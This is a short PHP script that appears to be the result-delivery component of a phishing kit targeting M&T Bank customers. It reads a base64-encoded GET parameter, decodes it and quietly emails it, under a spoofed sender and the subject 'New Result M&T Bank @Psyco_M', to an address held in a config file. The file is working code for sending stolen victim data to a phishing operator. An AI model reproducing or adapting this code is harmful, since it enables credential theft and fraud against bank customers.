<?php
include ('Config.php');
$headers = 'From: Psyco_M@Psycomantiste.web'. "\r\n" .
    'Reply-To: Psyco_M@Psycomantiste.web'. "\r\n";
$DATA = $_GET['Decodethis'];
$GLOBMSG = base64_decode($DATA);
@mail($YourEmail,'New Result M&T Bank @Psyco_M',$GLOBMSG,$headers);


?>
